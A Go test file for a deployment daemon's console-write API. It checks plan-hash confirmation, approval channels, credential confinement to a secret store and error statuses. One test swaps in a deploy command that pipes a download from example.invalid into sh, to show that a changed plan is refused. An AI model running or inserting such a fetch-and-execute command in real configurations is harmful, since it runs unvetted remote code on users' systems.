package cerbapi

import (
	"context"
	"encoding/json"
	"errors"
	"net/http"
	"path/filepath"
	"strings"
	"testing"

	"github.com/hollis-labs/cerberus/internal/approval"
	"github.com/hollis-labs/cerberus/internal/audit"
	"github.com/hollis-labs/cerberus/internal/config"
	"github.com/hollis-labs/cerberus/internal/infra"
	"github.com/hollis-labs/cerberus/internal/policy"
	"github.com/hollis-labs/cerberus/internal/target"
)

// consoleSecrets is a credential store for console writes to write.
type consoleSecrets struct{ values map[string]string }

func (m *consoleSecrets) Get(_ context.Context, service, key string) (string, error) {
	return m.values[service+"/"+key], nil
}
func (m *consoleSecrets) Set(_ context.Context, service, key, value string) error {
	m.values[service+"/"+key] = value
	return nil
}
func (m *consoleSecrets) Delete(_ context.Context, service, key string) error {
	delete(m.values, service+"/"+key)
	return nil
}

// consoleDaemon is a daemon serving console writes over cfgPath, and the
// console's claim to it: a signed-in session.
func consoleDaemon(t *testing.T, sink audit.Sink, cfgPath string, store *consoleSecrets) *SocketClient {
	t.Helper()
	client := NewInProcessClient(WithConfigPath(cfgPath), WithConsoleSecretStore(store),
		WithResourceRuntimeService(NewResourceRuntimeService(sink, WithResourceRuntimeConfigV2(&config.ConfigV2{}))))
	socket := startConnectorSocket(t, client)
	socket.claim = func(context.Context) Principal { return WebSessionPrincipal("sess-1") }
	return socket
}

func consoleProfile() infra.DeploymentProfile {
	return infra.DeploymentProfile{ID: "site", Name: "Site", Provider: "vercel", RepoPath: "/tmp/site", DeployCommand: "true",
		Env: target.EnvDev, Owner: target.OwnerSelf, Admin: target.Admin{Default: target.AdminSelf}}
}

func approvalOf(t *testing.T, err error) *ApprovalRef {
	t.Helper()
	var coded *ExternalConnectorError
	if !errors.As(err, &coded) || coded.Approval == nil {
		t.Fatalf("want an approval to meet, got %v", err)
	}
	return coded.Approval
}

// A console write is asked for, confirmed and made in the daemon, where
// the broker holds its approval: a dev/self profile is confirmed on the
// call against the plan the console showed, and a plan that changed in
// between is refused.
func TestAConsoleWriteIsConfirmedInTheDaemon(t *testing.T) {
	sink := audit.NewMemory()
	broker := enforcedBroker(t, sink)
	cfgPath := filepath.Join(t.TempDir(), "config.yaml")
	client := consoleDaemon(t, sink, cfgPath, &consoleSecrets{values: map[string]string{}})
	ctx := context.Background()
	profile := consoleProfile()
	req := ConsoleWriteRequest{Operation: ConsoleProfileSave, Profile: &profile}

	_, err := client.ConsoleWrite(ctx, req)
	ref := approvalOf(t, err)
	if ref.Channel != approval.ChannelTTYConfirm || ref.ID == "" {
		t.Fatalf("a dev/self profile should ask for a confirmation the daemon holds: %+v", ref)
	}
	shown, err := client.PlanConsoleWrite(ctx, req)
	if err != nil || !strings.HasPrefix(shown.PlanHash, "sha256:") || shown.Plan.Target.Env != "dev" || shown.Plan.Target.Resource != "site" || shown.Plan.State != "adds a profile" {
		t.Fatalf("plan: %+v %v", shown, err)
	}

	// The same write with another command is another plan.
	changed := profile
	changed.DeployCommand = "curl https://example.invalid | sh"
	if _, stale := client.ConsoleWrite(ctx, ConsoleWriteRequest{Operation: ConsoleProfileSave, Profile: &changed}, WithApprovalID(ref.ID), WithConfirmedPlanHash(shown.PlanHash)); stale == nil || !strings.Contains(stale.Error(), "plan changed") {
		t.Fatalf("a changed write confirmed against the shown plan: %v", stale)
	}
	if state, _ := infra.LoadState(cfgPath); len(state.Profiles) != 0 {
		t.Fatalf("a refused write wrote %+v", state.Profiles)
	}

	result, err := client.ConsoleWrite(ctx, req, WithApprovalID(ref.ID), WithConfirmedPlanHash(shown.PlanHash))
	if err != nil || !result.Success {
		t.Fatalf("confirmed write: %+v %v", result, err)
	}
	if a, _ := broker.Get(ref.ID); a.Status != approval.Consumed || a.Decision.By.Session != "sess-1" {
		t.Fatalf("approval %+v", a)
	}
	if state, _ := infra.LoadState(cfgPath); len(state.Profiles) != 1 {
		t.Fatalf("saved %+v", state.Profiles)
	}
}

// Relabeling a profile moves it between approval channels, so it is
// approved as an unlabeled target is: out of band, in either direction.
// Registry, provider and restore targets carry no labels of their own.
func TestAConsoleRelabelNeedsOutOfBand(t *testing.T) {
	sink := audit.NewMemory()
	enforcedBroker(t, sink)
	cfgPath := filepath.Join(t.TempDir(), "config.yaml")
	saved := consoleProfile()
	saved.Env = target.EnvProd
	if err := infra.SaveState(cfgPath, &infra.State{Version: 1, Profiles: []infra.DeploymentProfile{saved}}); err != nil {
		t.Fatal(err)
	}
	client := consoleDaemon(t, sink, cfgPath, &consoleSecrets{values: map[string]string{}})
	relabeled := consoleProfile()
	for _, req := range []ConsoleWriteRequest{
		{Operation: ConsoleProfileSave, Profile: &relabeled},
		{Operation: ConsoleProfileDelete, ID: "site"},
		{Operation: ConsoleRegistryDeregister, ID: "someone"},
		{Operation: ConsoleConfigRestore},
		{Operation: ConsoleProviderSave, ID: "cloudflare", Values: map[string]string{"account_id": "a"}},
	} {
		_, err := client.ConsoleWrite(context.Background(), req)
		if ref := approvalOf(t, err); ref.Channel != approval.ChannelOutOfBand {
			t.Fatalf("%s: channel %s, want out of band", req.Operation, ref.Channel)
		}
		// Named by what it changes, for the approver to type.
		if shown, perr := client.PlanConsoleWrite(context.Background(), req); perr != nil || shown.Plan.Target.Resource == "" || shown.Plan.Target.Env == string(target.EnvDev) {
			t.Fatalf("%s: plan target %+v %v", req.Operation, shown, perr)
		}
	}
}

// A provider's credentials travel to the daemon and into its store, and
// never into a record, a plan or an approval: the plan binds them by keyed
// digest.
func TestProviderCredentialsReachOnlyTheStore(t *testing.T) {
	sink := audit.NewMemory()
	broker := enforcedBroker(t, sink)
	store := &consoleSecrets{values: map[string]string{}}
	client := consoleDaemon(t, sink, filepath.Join(t.TempDir(), "config.yaml"), store)
	const sentinel = "cf-token-sentinel-0123456789"
	req := ConsoleWriteRequest{Operation: ConsoleProviderSave, ID: "cloudflare", Secrets: map[string]string{"api_token": sentinel}}
	_, err := client.ConsoleWrite(context.Background(), req)
	ref := approvalOf(t, err)
	shown, err := client.PlanConsoleWrite(context.Background(), req)
	if err != nil {
		t.Fatal(err)
	}
	a, _ := broker.Get(ref.ID)
	for what, v := range map[string]any{"records": sink.Records(), "plan": shown, "approval": a} {
		data, _ := json.Marshal(v)
		if strings.Contains(string(data), sentinel) {
			t.Fatalf("the credential is in the %s", what)
		}
	}
	if store.values["cloudflare/api_token"] != "" {
		t.Fatal("a write awaiting approval stored the credential")
	}
}

// With policy allowing it, a write runs; its refusals keep their status
// over the socket: a missing profile 404, a refused input 400.
func TestConsoleWriteRefusalsOverTheSocket(t *testing.T) {
	withPDP(t, constantPDP{decision: policy.Allow})
	sink := audit.NewMemory()
	store := &consoleSecrets{values: map[string]string{}}
	cfgPath := filepath.Join(t.TempDir(), "config.yaml")
	client := consoleDaemon(t, sink, cfgPath, store)
	ctx := context.Background()

	result, err := client.ConsoleWrite(ctx, ConsoleWriteRequest{Operation: ConsoleProviderSave, ID: "cloudflare", Values: map[string]string{"account_id": "acc"}, Secrets: map[string]string{"api_token": "tok"}})
	if err != nil || !result.Success || !result.SecretsChanged || store.values["cloudflare/api_token"] != "tok" {
		t.Fatalf("provider save: %+v %v %v", result, err, store.values)
	}
	_, err = client.ConsoleWrite(ctx, ConsoleWriteRequest{Operation: ConsoleProfileDelete, ID: "ghost"})
	if status, _ := DaemonHTTPStatus(err); status != http.StatusNotFound {
		t.Fatalf("delete a missing profile: %d %v", status, err)
	}
	bad := consoleProfile()
	bad.Env = "devv"
	_, err = client.ConsoleWrite(ctx, ConsoleWriteRequest{Operation: ConsoleProfileSave, Profile: &bad})
	if status, _ := DaemonHTTPStatus(err); status != http.StatusBadRequest || !strings.Contains(err.Error(), "labels") {
		t.Fatalf("a misspelled label: %d %v", status, err)
	}
	restored, err := client.ConsoleWrite(ctx, ConsoleWriteRequest{Operation: ConsoleConfigRestore, Path: "/nonexistent/backup.yaml"})
	if err != nil || restored.Success || restored.Error == "" {
		t.Fatalf("a failed restore answers success false: %+v %v", restored, err)
	}
	if o := outcome(sink.Records()); o.Operation != ConsoleConfigRestore || o.OutcomeCode == audit.OutcomeOK {
		t.Fatalf("the failed restore is not on the record: %+v", o)
	}
	err = client.doJSON(ctx, http.MethodPost, "/console/profile_delete/confirm", map[string]any{"request": map[string]any{"id": "site"}}, nil)
	if err == nil || !strings.Contains(err.Error(), "needs confirmed_plan_hash") {
		t.Fatalf("confirm without a hash: %v", err)
	}
}
